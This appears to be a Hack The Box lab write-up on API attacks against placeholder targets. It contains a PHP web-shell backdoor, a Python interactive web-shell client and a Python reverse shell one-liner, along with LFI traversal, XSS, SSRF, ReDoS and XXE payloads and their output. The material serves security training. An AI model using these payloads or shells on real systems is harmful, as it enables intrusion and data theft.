# API Attacks

## Information Disclosure (with a twist of SQLi)

### Information Disclosure through Fuzzing

Suppose we are assessing an API residing in `http://<TARGET IP>:3003`.

Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using _ffuf_ and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) list, as follows.

We notice a similar response size in every request. This is because supplying any parameter will return the same text, not an error like 404.

Let us filter out any responses having a size of 19, as follows.

&#x20; Information Disclosure (with a twist of SQLi)

<pre class="language-shell-session"><code class="lang-shell-session">eldeim@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://&#x3C;TARGET IP>:3003/?FUZZ=test_value' -fs 19

 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

<strong>       v1.3.1 Kali Exclusive &#x3C;3
</strong>________________________________________________

 :: Method           : GET
 :: URL              : http://&#x3C;TARGET IP>:3003/?FUZZ=test_value
 :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 19
________________________________________________

:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 id                      [Status: 200, Size: 38, Words: 7, Lines: 1]
:: Progress: [57/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 
:: Progress: [187/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
:: Progress: [375/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
:: Progress: [567/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
:: Progress: [755/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
:: Progress: [952/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
:: Progress: [1160/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 
:: Progress: [1368/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 
:: Progress: [1573/2588] :: Job [1/1] :: 1720 req/sec :: Duration: [0:00:01] :: Error
:: Progress: [1752/2588] :: Job [1/1] :: 1437 req/sec :: Duration: [0:00:01] :: Error
:: Progress: [1947/2588] :: Job [1/1] :: 1625 req/sec :: Duration: [0:00:01] :: Error
:: Progress: [2170/2588] :: Job [1/1] :: 1777 req/sec :: Duration: [0:00:01] :: Error
:: Progress: [2356/2588] :: Job [1/1] :: 1435 req/sec :: Duration: [0:00:01] :: Error
:: Progress: [2567/2588] :: Job [1/1] :: 2103 req/sec :: Duration: [0:00:01] :: Error
:: Progress: [2588/2588] :: Job [1/1] :: 2120 req/sec :: Duration: [0:00:01] :: Error
:: Progress: [2588/2588] :: Job [1/1] :: 2120 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
</code></pre>

It looks like _id_ is a valid parameter. Let us check the response when specifying _id_ as a parameter and a test value.

&#x20; Information Disclosure (with a twist of SQLi)

```shell-session
eldeim@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
[{"id":"1","username":"admin","position":"1"}]
```

Find below a Python script that could automate retrieving all information that the API returns (save it as `brute_api.py`).

<pre class="language-python"><code class="lang-python"><strong>import requests, sys
</strong>
def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://&#x3C;TARGET IP>:3003/")

brute()
</code></pre>

* We import two modules _requests_ and _sys_. _requests_ allows us to make HTTP requests (GET, POST, etc.), and _sys_ allows us to parse system arguments.
* We define a function called _brute_, and then we define a variable called _value_ which has a range of _10000_. _try_ and _except_ help in exception handling.
* _url = sys.argv\[1]_ receives the first argument.
* _r = requests.get(url + '/?id='+str(val))_ creates a response object called _r_ which will allow us to get the response of our GET request. We are just appending _/?id=_ to our request and then _val_ follows, which will have a value in the specified range.
* _if "position" in r.text:_ looks for the _position_ string in the response. If we enter a valid ID, it will return the position and other information. If we don't, it will return _\[]_.

The above script can be run, as follows.

```shell-session
eldeim@htb[/htb]$ python3 brute_api.py http://<TARGET IP>:3003
Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
...
```

### PoCs - Questions

* What is the username of the third user (id=3)?

<figure><img src="../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://10.129.202.133:3003/?FUZZ=test_value' -fs 19
________________________________________________

id                      [Status: 200, Size: 38, Words: 7, Lines: 1, Duration: 24ms]
```

<figure><img src="../../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



* Identify the username of the user that has a position of 736373 through SQLi. Submit it as your answer.<br>

<figure><img src="../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Arbitrary File Upload

Suppose we are assessing an application residing in `http://<TARGET IP>:3001`.

When we browse the application, an anonymous file uploading functionality sticks out.

<figure><img src="../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let us create the below file (save it as `backdoor.php`) and try to upload it via the available functionality.

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

> The above allows us to append the parameter _cmd_ to our request (to backdoor.php), which will be executed using _system()_. This is if we can determine _backdoor.php_'s location, if _backdoor.php_ will be rendered successfully and if no PHP function restrictions exist.

<figure><img src="../../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can use the below Python script (save it as `web_shell.py`) to obtain a shell, leveraging the uploaded `backdoor.php` file.

```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```

Use the script as follows.

&#x20; Arbitrary File Upload

```shell-session
eldeim@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ id
uid=0(root) gid=0(root) groups=0(root)
```

To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.

&#x20; Arbitrary File Upload

```shell-session
eldeim@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

***

## Local File Inclusion (LFI)

Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api`.

Let us first interact with it.

```shell-session
eldeim@htb[/htb]$ curl http://<TARGET IP>:3000/api
{"status":"UP"}
```

We don't see anything helpful except the indication that the API is up and running. Let us perform API endpoint fuzzing using _ffuf_ and the [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt) list, as follows.

```shell-session
eldeim@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>:3000/api/FUZZ
 :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

:: Progress: [40/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors
download                [Status: 200, Size: 71, Words: 5, Lines: 1]
:: Progress: [87/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: 
Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: 
Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

It looks like `/api/download` is a valid API endpoint. Let us interact with it.

```shell-session
eldeim@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
{"success":false,"error":"Input the filename via /download/<filename>"}
```

We need to specify a file, but we do not have any knowledge of stored files or their naming scheme. We can try mounting a Local File Inclusion (LFI) attack, though.

```shell-session
eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
127.0.0.1 localhost
127.0.1.1 nix01-websvc

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The API is indeed vulnerable to Local File Inclusion!

***

## Cross-Site Scripting (XSS)

<figure><img src="../../../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`test_value` is reflected in the response.

Let us see what happens when we enter a payload such as the below (instead of _test\_value_).

Code: javascript

```javascript
<script>alert(document.domain)</script>
```

<figure><img src="../../../.gitbook/assets/image (26) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It looks like the application is encoding the submitted payload. We can try URL-encoding our payload once and submitting it again, as follows.

```javascript
%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

<figure><img src="../../../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Server-Side Request Forgery (SSRF)

Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api/userinfo`.

Let us first interact with it.

&#x20; Server-Side Request Forgery (SSRF)

```shell-session
eldeim@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```

The API is expecting a parameter called _id_. Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first.

```shell-session
eldeim@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
```

Then, let us specify `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` as the value of the _id_ parameter and make an API call.

```shell-session
eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
{"success":false,"error":"'id' parameter is invalid."}
```

We notice an error about the _id_ parameter being invalid, and we also notice no connection being made to our listener.

In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` and making an API call again.

```shell-session
eldeim@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF

```shell-session
eldeim@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```

As time allows, try to provide APIs with input in various formats/encodings.

***

## Regular Expression Denial of Service (ReDoS)

The API resides in `http://<TARGET IP>:3000/api/check-email` and accepts a parameter called _email_.

Let's interact with it as follows.

&#x20; Regular Expression Denial of Service (ReDoS)

```shell-session
eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

Submit the above regex to [regex101.com](https://regex101.com/) for an in-depth explanation. Then, submit the above regex to [https://jex.im/regulex/](https://jex.im/regulex/#!flags=\&re=%5E\(%5Ba-zA-Z0-9_.-%5D\)%2B%40\(\(%5Ba-zA-Z0-9-%5D\)%2B.\)%2B\(%5Ba-zA-Z0-9%5D%7B2%2C4%7D\)%2B%24) for a visualization.

<figure><img src="../../../.gitbook/assets/image (28) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The second and third groups are doing bad iterative checks.

Let's submit the following valid value and see how long the API takes to respond.

&#x20; Regular Expression Denial of Service (ReDoS)

```shell-session
eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.

The difference in response time between the first cURL command above and the second is significant.

The API is undoubtedly vulnerable to ReDoS attacks.

***

## XML External Entity (XXE) Injection

By the time we browse `http://<TARGET IP>:3001`, we come across an authentication page.

Run Burp Suite as follows.

```shell-session
eldeim@htb[/htb]$ burpsuite
```

Activate burp suite's proxy (_Intercept On_) and configure your browser to go through it.

Now let us try authenticating. We should see the below inside Burp Suite's proxy.

<figure><img src="../../../.gitbook/assets/image (29) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```http
POST /api/login/ HTTP/1.1
Host: <TARGET IP>:3001
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 111
Origin: http://<TARGET IP>:3001
DNT: 1
Connection: close
Referer: http://<TARGET IP>:3001/
Sec-GPC: 1

<?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>
```

* We notice that an API is handling the user authentication functionality of the application.
* User authentication is generating XML data.

Let us try crafting an exploit to read internal files such as _/etc/passwd_ on the server.

First, we will need to append a DOCTYPE to this request.

> What is a DOCTYPE? == DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).

Our current payload is:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```

We defined a DTD called _pwn_, and inside of that, we have an `ENTITY`. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the ENTITY keyword, followed by the `ENTITY` name and its value.

We have called our external entity _somename_, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.

Let us set up a Netcat listener as follows.

&#x20;eldeim@htb\[/htb]$ nc -nlvp 4444

```shell-session
listening on [any] 4444 ...
```

Now let us make an API call containing the payload we crafted above.

```shell-session
eldeim@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
<p>Sorry, we cannot find a account with <b></b> email.</p>
```

We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows.

```shell-session
eldeim@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'

```

After the call to the API, you will notice a connection being made to the listener.

```shell-session
eldeim@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
GET / HTTP/1.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```
